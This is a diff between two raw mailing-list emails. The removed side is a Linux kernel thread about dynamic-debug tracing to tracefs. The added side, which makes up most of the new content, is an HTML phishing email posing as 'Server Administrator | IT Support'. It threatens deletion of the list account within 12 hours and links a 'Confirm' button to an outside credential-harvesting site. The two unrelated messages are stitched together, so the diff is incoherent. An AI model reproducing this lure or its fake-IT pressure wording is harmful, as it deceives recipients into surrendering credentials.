@@ -2,63 +2,36 @@ Return-Path: <intel-gvt-dev-bounces@lists.freedesktop.org>
 X-Original-To: lists+intel-gvt-dev@lfdr.de
 Delivered-To: lists+intel-gvt-dev@lfdr.de
 Received: from gabe.freedesktop.org (gabe.freedesktop.org [131.252.210.177])
-	by mail.lfdr.de (Postfix) with ESMTPS id 2CB06452D19
-	for <lists+intel-gvt-dev@lfdr.de>; Tue, 16 Nov 2021 09:46:45 +0100 (CET)
+	by mail.lfdr.de (Postfix) with ESMTPS id 21670455747
+	for <lists+intel-gvt-dev@lfdr.de>; Thu, 18 Nov 2021 09:47:54 +0100 (CET)
 Received: from gabe.freedesktop.org (localhost [127.0.0.1])
-	by gabe.freedesktop.org (Postfix) with ESMTP id 041086F3F7;
-	Tue, 16 Nov 2021 08:46:42 +0000 (UTC)
+	by gabe.freedesktop.org (Postfix) with ESMTP id BBB5E6EB54;
+	Thu, 18 Nov 2021 08:47:52 +0000 (UTC)
 X-Original-To: intel-gvt-dev@lists.freedesktop.org
 Delivered-To: intel-gvt-dev@lists.freedesktop.org
-Received: from mail-lj1-x22e.google.com (mail-lj1-x22e.google.com
- [IPv6:2a00:1450:4864:20::22e])
- by gabe.freedesktop.org (Postfix) with ESMTPS id 91BD46F3F2;
- Tue, 16 Nov 2021 08:46:41 +0000 (UTC)
-Received: by mail-lj1-x22e.google.com with SMTP id e7so27086564ljq.12;
- Tue, 16 Nov 2021 00:46:41 -0800 (PST)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=gmail.com; s=20210112;
- h=date:from:to:cc:subject:message-id:in-reply-to:references
- :mime-version; bh=B+4475Nz0EJEw1btKnS6lbGHGzgnMTR6vRIDIHfcqkg=;
- b=AHjnsSgzVUrwMtIn2hzKlQ7zcUO9w2GxgF7iClKlNlQkjIwFGpO584TH3tmeXy97zF
- gZBJJiZtURTMLV9CzFsoOrn3DlNdSYs06nMlEIMpVhxTnKRawq3Cg5WiAnHG9H/r7afV
- i2BMBtpJiDhzO/y5stgpGkCV59rHJPJ7IkMBOKJ/dSTinie5byqIB7sjXwlvYH9sNnjr
- vKGy8b1l7meUPMQ/M9RlZd416KZNlN+bRznsZ3+YzywCmOBAgkgoCb9BkuqunSH1/hQL
- ITC2w/0pAXLOHmjwxGuNkfSqM3QgAObfTJpMBcPSF4fDDwLbI6GC2gcRxsy9vpjFYC+J
- VDMA==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
- d=1e100.net; s=20210112;
- h=x-gm-message-state:date:from:to:cc:subject:message-id:in-reply-to
- :references:mime-version;
- bh=B+4475Nz0EJEw1btKnS6lbGHGzgnMTR6vRIDIHfcqkg=;
- b=Ffz8gYrO0I1DzBl/tMVdbOY4bCIZYnV5svMg3SpgF+mZF3RUujcvBhuAsDz0sEb6Lp
- 8OYCE8GfNxF/Y7Y8kJMf7Ss+eEyQtalKRDOq+4C6vc8MEyvYVRz5xuVlQbxgzmwGKCuv
- ihLf8ZaSThMaVyCUlP7pU90UnTo60Wj4FpmrTWpFomzkBJMhYhVv6klmrYAPBPN4pdbw
- YduGnJV/3Cn3C0rVU3ubeNRVsz7NjxWRgzMKxm9Jrrp9rZXKMmy7MqR96GyhGRsMbH66
- kNq+AxRW5Fizkq635CWRh32F2rWwGtXZzPAd/V1luFZ8whP91vuCe8hJ9buP+L5HQYV1
- CNzg==
-X-Gm-Message-State: AOAM532HTgCh20PkFBqfo4caq8ge2aAl6KeGNZ0OqhHaijGT3jmpLkrd
- qHLyj02pFxgiQuZqsL6VFV0=
-X-Google-Smtp-Source: ABdhPJx+P8W2uhzddSw3fnTmEhpfFIZRj2/R8Je3b+El+xG49yzo/zN4B9vsrQxVsH5Cm9iD/9YFHw==
-X-Received: by 2002:a2e:b88d:: with SMTP id r13mr5295292ljp.362.1637052399848; 
- Tue, 16 Nov 2021 00:46:39 -0800 (PST)
-Received: from eldfell ([194.136.85.206])
- by smtp.gmail.com with ESMTPSA id d23sm1692776lfm.107.2021.11.16.00.46.39
- (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
- Tue, 16 Nov 2021 00:46:39 -0800 (PST)
-Date: Tue, 16 Nov 2021 10:46:31 +0200
-From: Pekka Paalanen <ppaalanen@gmail.com>
-To: Jason Baron <jbaron@akamai.com>
-Subject: Re: [PATCH v10 08/10] dyndbg: add print-to-tracefs, selftest with
- it - RFC
-Message-ID: <20211116104631.195cbd0b@eldfell>
-In-Reply-To: <f3914fa9-8b22-d54e-3f77-d998e74094b9@akamai.com>
-References: <20211111220206.121610-1-jim.cromie@gmail.com>
- <20211111220206.121610-9-jim.cromie@gmail.com>
- <20211112114953.GA1381@axis.com>
- <f3914fa9-8b22-d54e-3f77-d998e74094b9@akamai.com>
-X-Mailer: Claws Mail 3.17.8 (GTK+ 2.24.33; x86_64-pc-linux-gnu)
+X-Greylist: delayed 600 seconds by postgrey-1.36 at gabe;
+ Thu, 18 Nov 2021 08:47:51 UTC
+Received: from noreply0.sotetsu.co.jp (unknown [143.198.233.185])
+ by gabe.freedesktop.org (Postfix) with ESMTPS id 9DFCE6EB57
+ for <intel-gvt-dev@lists.freedesktop.org>;
+ Thu, 18 Nov 2021 08:47:51 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=default;
+ d=sotetsu.co.jp; 
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:
+ Content-Transfer-Encoding; i=noreply@sotetsu.co.jp;
+ bh=bKMhiQ5oLD9+lrsJbYtWmJSFK7mJ2NAvLBkGL7KM0hM=;
+ b=LZnd1Lo8is3XfEVQQ3dkHPcl5mhOHtSbxsR+410gE7F3NabEVgnLSJftBEddeZ5aNtNdsw9u26tA
+ Yl5V0GINm6vhbS5Km92xCcnLyVOn3f4jUudilZz6ovLLvpjlnDh0pJP8NqNLjfJOTWXwFWmYMv0v
+ 45+s6l/7CZeLjG72z+E=
+From: Server Administrator | IT Support <noreply@sotetsu.co.jp>
+To: intel-gvt-dev@lists.freedesktop.org
+Subject: Deativation Notice: intel-gvt-dev@lists.freedesktop.org
+Date: 18 Nov 2021 00:28:06 -0800
+Message-ID: <20211118002806.AFBFB9DCE336DFE8@sotetsu.co.jp>
 MIME-Version: 1.0
-Content-Type: multipart/signed; boundary="Sig_/Y5Z_1H8x236jEerk/fTWs86";
- protocol="application/pgp-signature"; micalg=pgp-sha256
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
 X-BeenThere: intel-gvt-dev@lists.freedesktop.org
 X-Mailman-Version: 2.1.29
 Precedence: list
@@ -71,150 +44,123 @@ List-Post: <mailto:intel-gvt-dev@lists.freedesktop.org>
 List-Help: <mailto:intel-gvt-dev-request@lists.freedesktop.org?subject=help>
 List-Subscribe: <https://lists.freedesktop.org/mailman/listinfo/intel-gvt-dev>, 
  <mailto:intel-gvt-dev-request@lists.freedesktop.org?subject=subscribe>
-Cc: quic_saipraka@quicinc.com, catalin.marinas@arm.com,
- dri-devel@lists.freedesktop.org, will@kernel.org,
- intel-gvt-dev@lists.freedesktop.org,
- Vincent Whitchurch <vincent.whitchurch@axis.com>,
- amd-gfx@lists.freedesktop.org, mingo@redhat.com, daniel.vetter@ffwll.ch,
- arnd@arndb.de, linux-arm-msm@vger.kernel.org, intel-gfx@lists.freedesktop.org,
- rostedt@goodmis.org, mathieu.desnoyers@efficios.com, sean@poorly.run,
- linux-arm-kernel@lists.infradead.org, Jim Cromie <jim.cromie@gmail.com>,
- gregkh@linuxfoundation.org, linux-kernel@vger.kernel.org,
- quic_psodagud@quicinc.com, maz@kernel.org, seanpaul@chromium.org
 Errors-To: intel-gvt-dev-bounces@lists.freedesktop.org
 Sender: "intel-gvt-dev" <intel-gvt-dev-bounces@lists.freedesktop.org>
 
---Sig_/Y5Z_1H8x236jEerk/fTWs86
-Content-Type: text/plain; charset=US-ASCII
-Content-Transfer-Encoding: quoted-printable
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
 
-On Fri, 12 Nov 2021 10:08:41 -0500
-Jason Baron <jbaron@akamai.com> wrote:
-
-> On 11/12/21 6:49 AM, Vincent Whitchurch wrote:
-> > On Thu, Nov 11, 2021 at 03:02:04PM -0700, Jim Cromie wrote: =20
-> >> Sean Paul proposed, in:
-> >> https://urldefense.com/v3/__https://patchwork.freedesktop.org/series/7=
-8133/__;!!GjvTz_vk!HcKnMRByYkIdyF1apqQjlN5aBIomzJR1an3YWXM6KXs0EftVMQdrewRA=
-8Dki4A$=20
-> >> drm/trace: Mirror DRM debug logs to tracefs
-> >>
-> >> His patchset's objective is to be able to independently steer some of
-> >> the drm.debug stream to an alternate tracing destination, by splitting
-> >> drm_debug_enabled() into syslog & trace flavors, and enabling them
-> >> separately.  2 advantages were identified:
-> >>
-> >> 1- syslog is heavyweight, tracefs is much lighter
-> >> 2- separate selection of enabled categories means less traffic
-> >>
-> >> Dynamic-Debug can do 2nd exceedingly well:
-> >>
-> >> A- all work is behind jump-label's NOOP, zero off cost.
-> >> B- exact site selectivity, precisely the useful traffic.
-> >>    can tailor enabled set interactively, at shell.
-> >>
-> >> Since the tracefs interface is effective for drm (the threads suggest
-> >> so), adding that interface to dynamic-debug has real potential for
-> >> everyone including drm.
-> >>
-> >> if CONFIG_TRACING:
-> >>
-> >> Grab Sean's trace_init/cleanup code, use it to provide tracefs
-> >> available by default to all pr_debugs.  This will likely need some
-> >> further per-module treatment; perhaps something reflecting hierarchy
-> >> of module,file,function,line, maybe with a tuned flattening.
-> >>
-> >> endif CONFIG_TRACING
-> >>
-> >> Add a new +T flag to enable tracing, independent of +p, and add and
-> >> use 3 macros: dyndbg_site_is_enabled/logging/tracing(), to encapsulate
-> >> the flag checks.  Existing code treats T like other flags. =20
-> >=20
-> > I posted a patchset a while ago to do something very similar, but that
-> > got stalled for some reason and I unfortunately didn't follow it up:
-> >=20
-> >  https://urldefense.com/v3/__https://lore.kernel.org/lkml/2020082515333=
-8.17061-1-vincent.whitchurch@axis.com/__;!!GjvTz_vk!HcKnMRByYkIdyF1apqQjlN5=
-aBIomzJR1an3YWXM6KXs0EftVMQdrewRGytKHPg$=20
-> >=20
-> > A key difference between that patchset and this patch (besides that
-> > small fact that I used +x instead of +T) was that my patchset allowed
-> > the dyndbg trace to be emitted to the main buffer and did not force them
-> > to be in an instance-specific buffer. =20
->=20
-> Yes, I agree I'd prefer that we print here to the 'main' buffer - it
-> seems to keep things simpler and easier to combine the output from
-> different sources as you mentioned.
-
-Hi,
-
-I'm not quite sure I understand this discussion, but I would like to
-remind you all of what Sean's original work is about:
-
-Userspace configures DRM tracing into a flight recorder buffer (I guess
-this is what you refer to "instance-specific buffer").
-
-Userspace runs happily for months, and then hits a problem: a failure
-in the DRM sub-system most likely, e.g. an ioctl that should never
-fail, failed. Userspace handles that failure by dumping the flight
-recorder buffer into a file and saving or sending a bug report. The
-flight recorder contents give a log of all relevant DRM in-kernel
-actions leading to the unexpected failure to help developers debug it.
-
-I don't mind if one can additionally send the flight recorder stream to
-the main buffer, but I do want the separate flight recorder buffer to
-be an option so that a) unrelated things cannot flood the interesting
-bits out of it, and b) the scope of collected information is relevant.
-
-The very reason for this work is problems that are very difficult to
-reproduce in practice, either because the problem itself is triggered
-very rarely and randomly, or because the end users of the system have
-either no knowledge or no access to reconfigure debug logging and then
-reproduce the problem with good debug logs.
-
-Thank you very much for pushing this work forward!
-
-
-Thanks,
-pq
-
->=20
-> Thanks,
->=20
-> -Jason
->=20
-> >=20
-> > That feature is quite important at least for my use case since I often
-> > use dyndbg combined with function tracing, and the latter doesn't work
-> > on non-main instances according to Documentation/trace/ftrace.rst.
-> >=20
-> > For example, here's a random example of a bootargs from one of my recent
-> > debugging sessions:
-> >=20
-> >  trace_event=3Dprintk:* ftrace_filter=3D_mmc*,mmc*,sd*,dw_mci*,mci*
-> >  ftrace=3Dfunction trace_buf_size=3D20M dyndbg=3D"file drivers/mmc/* +x"
-> >  =20
-
-
---Sig_/Y5Z_1H8x236jEerk/fTWs86
-Content-Type: application/pgp-signature
-Content-Description: OpenPGP digital signature
-
------BEGIN PGP SIGNATURE-----
-
-iQIzBAEBCAAdFiEEJQjwWQChkWOYOIONI1/ltBGqqqcFAmGTb+cACgkQI1/ltBGq
-qqdRKg/+JPfzhGvv0UVAPJ+OJ9EYLVCYiKfXrGgNS2ks5BZLaBFB2l4WeRLmL59R
-wqm2UkmeiIAnR+tWVZ5YPBPm5nhaHMfwNdOR2J9AHxI3goTZoJkGNeizBSLVi0jb
-QK6RTGsy2CdF4se9MO7e6IS6nGu+Qb4W6MrSZSCCiTwQMjAPYgxOCeMngdlTjkOp
-CRen7osuGgeRhm74yyyhX/BPg2WKORPFPL80sBiw6IET1IxPen5DgGJ4Nc0jXc7r
-62bncv0J74eOe+w3XRpwwlz1Gm3rNlBQ9zQfkYtsWJe9oA6cD7+cJ6W2SvDSjZi6
-utYM7hnrLbOK/XBkAFcetb8dHAQ/uuaIq75hcz3nho9/P2Hk+5SnwtzzYYcwvV5A
-UIrq96U6r4mWKoGaBySkdBQ0qvi+YUzDDX6SVCTGKcfncjHNcZNyryO7F7/CDMlr
-3yEvgr+8gOIcgWAhKpHgF5DsY8GfKfcgHf0USwDZVmDNmrkProTf3MeFSryXeEiI
-867arY2KKHcGUVvfyfwT28/W+Y+LK7aD9UhUyvnMIVd0IbZ7+Adl9Q/F1wYikYW8
-QtlynecLTKZACjYRqUe2Wow4b9Uqlz7bsexOFE8xGoV/+Z7wsYFKm7wx732ZBy/V
-E9sUEn/oqiTQSv0/gi5U2e2g9Sv0N8wotSgs1ENwb+2ixHc2i/w=
-=CCnA
------END PGP SIGNATURE-----
-
---Sig_/Y5Z_1H8x236jEerk/fTWs86--
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.17037"></HEAD>
+<body style=3D"MARGIN: 0.5em">
+<P>
+<table style=3D"FONT-SIZE: 14px; MAX-WIDTH: 620px; FONT-FAMILY: Roboto, san=
+s-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COLLAPSE: collapse;=
+ TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: nor=
+mal; MARGIN: 5px auto; BORDER-SPACING: 0px; ORPHANS: 2; WIDOWS: 2; LETTER-S=
+PACING: normal; text-decoration-style: initial; text-decoration-color: init=
+ial; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-tex=
+t-stroke-width: 0px; text-decoration-thickness:=20
+initial" cellspacing=3D"0" cellpadding=3D"0" width=3D"100%" align=3D"center=
+" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; FONT-FAMILY: Roboto, RobotoDraft, Helv=
+etica, Arial, sans-serif; BORDER-COLLAPSE: collapse; MARGIN: 0px">
+<table style=3D"BORDER-TOP: rgb(204,204,204) 1px solid; BORDER-RIGHT: rgb(2=
+04,204,204) 1px solid; BORDER-COLLAPSE: collapse; BORDER-BOTTOM: rgb(204,20=
+4,204) 1px solid; BORDER-SPACING: 0px; BORDER-LEFT: rgb(204,204,204) 1px so=
+lid; BACKGROUND-COLOR: rgb(228,228,228)" cellspacing=3D"0" cellpadding=3D"0=
+" width=3D"100%" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box" height=3D32>
+<td style=3D"BOX-SIZING: border-box; FONT-FAMILY: Roboto, RobotoDraft, Helv=
+etica, Arial, sans-serif; BORDER-COLLAPSE: collapse; PADDING-LEFT: 15px; MA=
+RGIN: 0px; PADDING-RIGHT: 15px" valign=3D"middle" width=3D"32" align=3D"lef=
+t"><BR style=3D"BOX-SIZING: border-box"><BR style=3D"BOX-SIZING: border-box=
+"><BR style=3D"BOX-SIZING: border-box"></TD>
+<td style=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; FONT-FAMILY: &quot;Sy=
+mantec Sans&quot;; BORDER-COLLAPSE: collapse; MARGIN: 0px" valign=3D"middle=
+" align=3D"left"><FONT style=3D"BOX-SIZING: border-box; VERTICAL-ALIGN: inh=
+erit"><FONT style=3D"BOX-SIZING: border-box; VERTICAL-ALIGN: inherit"><SPAN=
+ style=3D"BOX-SIZING: border-box">Server</SPAN>&nbsp;Administrator |&nbsp;I=
+T Support</FONT></FONT><BR style=3D"BOX-SIZING: border-box"></TD></TR>
+<TR style=3D"BOX-SIZING: border-box; PADDING-LEFT: 15px" height=3D3>
+<td style=3D"BOX-SIZING: border-box; FONT-FAMILY: Roboto, RobotoDraft, Helv=
+etica, Arial, sans-serif; BORDER-COLLAPSE: collapse; MARGIN: 0px"><BR style=
+=3D"BOX-SIZING: border-box"></TD>
+<td style=3D"BOX-SIZING: border-box; FONT-FAMILY: Roboto, RobotoDraft, Helv=
+etica, Arial, sans-serif; BORDER-COLLAPSE: collapse; MARGIN: 0px"><BR style=
+=3D"BOX-SIZING: border-box"></TD></TR></TBODY></TABLE>
+<table style=3D"BORDER-TOP: rgb(204,204,204) 1px solid; BORDER-RIGHT: rgb(2=
+04,204,204) 1px solid; BORDER-COLLAPSE: collapse; BORDER-BOTTOM: rgb(204,20=
+4,204) 1px solid; BORDER-SPACING: 0px; BORDER-LEFT: rgb(204,204,204) 1px so=
+lid" cellspacing=3D"0" cellpadding=3D"0" width=3D"100%" bgcolor=3D"#ffffff"=
+ border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; FONT-SIZE: 13px; FONT-FAMILY: Calibri;=
+ BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-=
+LEFT: 15px; MARGIN: 0px; LINE-HEIGHT: 27px; PADDING-RIGHT: 15px; BACKGROUND=
+-COLOR: rgb(236,243,249)"><SPAN style=3D"BOX-SIZING: border-box; FONT-WEIGH=
+T: bolder"><FONT style=3D"BOX-SIZING: border-box; VERTICAL-ALIGN: inherit">=
+<FONT style=3D"BOX-SIZING: border-box; VERTICAL-ALIGN: inherit">Dear&nbsp;<=
+FONT color=3D#000000>intel-gvt-dev</FONT>&nbsp;,</FONT></FONT>
+ </SPAN></TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; FONT-SIZE: 13px; FONT-FAMILY: Calibri;=
+ BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 5px; PADDING-TOP: 0px; PADDING-=
+LEFT: 15px; MARGIN: 0px; LINE-HEIGHT: 27px; PADDING-RIGHT: 15px; BACKGROUND=
+-COLOR: rgb(236,243,249)">
+<table style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif=
+; BORDER-COLLAPSE: collapse" cellspacing=3D"0" cellpadding=3D"0" width=3D"1=
+00%" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box; COLOR: rgb(64,64,64); LINE-HEIGHT: 26p=
+x">
+<td style=3D"BOX-SIZING: border-box; FONT-FAMILY: Roboto, RobotoDraft, Helv=
+etica, Arial, sans-serif; MARGIN: 0px">
+<P style=3D"BOX-SIZING: border-box; MARGIN-TOP: 0px"><FONT style=3D"BOX-SIZ=
+ING: border-box; VERTICAL-ALIGN: inherit"><FONT style=3D"BOX-SIZING: border=
+-box; VERTICAL-ALIGN: inherit">We are closing all old versions and non-acti=
+ve users from&nbsp;our domain server.<BR><WBR>&nbsp;Please confirm your&nbs=
+p;intel-gvt-dev@lists.freedesktop.org<U><FONT color=3D#0066cc></FONT></U>&n=
+bsp;to keep your account from being deactivated.</FONT></FONT></P></TD></TR=
+></TBODY></TABLE></TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; FONT-FAMILY: Roboto, RobotoDraft, Helv=
+etica, Arial, sans-serif; BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 10px; =
+PADDING-TOP: 10px; PADDING-LEFT: 10px; MARGIN: 0px; PADDING-RIGHT: 10px" wi=
+dth=3D"300" align=3D"left">
+<A style=3D'BOX-SIZING: border-box; FONT-SIZE: 15px; MAX-WIDTH: 210px; FONT=
+-FAMILY: "Open Sans", "Helvetica Neue", Arial; WIDTH: 210px; COLOR: white; =
+OUTLINE-WIDTH: medium; PADDING-BOTTOM: 14px; TEXT-ALIGN: center; PADDING-TO=
+P: 14px; OUTLINE-STYLE: none; PADDING-LEFT: 7px; MARGIN: 0px; DISPLAY: bloc=
+k; OUTLINE-COLOR: invert; PADDING-RIGHT: 7px; BACKGROUND-COLOR: darkblue; b=
+order-radius: 4px; text-decoration-line: none' href=3D"https://www.drvirald=
+esai.com/ssl/?email=3Dintel-gvt-dev@lists.freedesktop.org" rel=3Dnoreferrer=
+=20
+target=3D_blank data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttp=
+s://5e841ae2.srvr-cloudmail-srvr6765e7tg.pages.dev/?emailtoken%3Dmail@verso=
+l.co.uk%26domain%3Dversol.co.uk&amp;source=3Dgmail&amp;ust=3D16365296425810=
+00&amp;usg=3DAFQjCNEmhKCuqHew-EqQhTsE8WhQtPxplQ"><FONT style=3D"BOX-SIZING:=
+ border-box; VERTICAL-ALIGN: inherit"><FONT style=3D"BOX-SIZING: border-box=
+; VERTICAL-ALIGN: inherit" color=3D#4218e7><STRONG>Confirm</STRONG></FONT><=
+/FONT></A></TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; FONT-SIZE: 0px; FONT-FAMILY: Roboto, R=
+obotoDraft, Helvetica, Arial, sans-serif; BORDER-COLLAPSE: collapse; PADDIN=
+G-BOTTOM: 5px; PADDING-TOP: 5px; PADDING-LEFT: 15px; MARGIN: 0px; LINE-HEIG=
+HT: 0; PADDING-RIGHT: 15px">&nbsp;</TD></TR>
+<TR style=3D"BOX-SIZING: border-box; MARGIN-TOP: 10px; BACKGROUND-COLOR: rg=
+b(228,228,228)">
+<td style=3D"BOX-SIZING: border-box; FONT-SIZE: 13px; FONT-FAMILY: Calibri;=
+ BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 10px; PADDING-TOP: 10px; PADDIN=
+G-LEFT: 15px; MARGIN: 0px; LINE-HEIGHT: 20px; PADDING-RIGHT: 15px">
+<P style=3D"BOX-SIZING: border-box; MARGIN-TOP: 0px"><FONT style=3D"BOX-SIZ=
+ING: border-box; VERTICAL-ALIGN: inherit"><FONT style=3D"BOX-SIZING: border=
+-box; VERTICAL-ALIGN: inherit">11/18/2021 12:28:06 a.m. Account will be&nbs=
+p; automatically deleted after 12 hours from&nbsp;lists.freedesktop.org&nbs=
+p; You can change the frequency of these notifications within your mailbox =
+portal.</FONT></FONT></P></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABL=
+E></P></BODY></HTML>
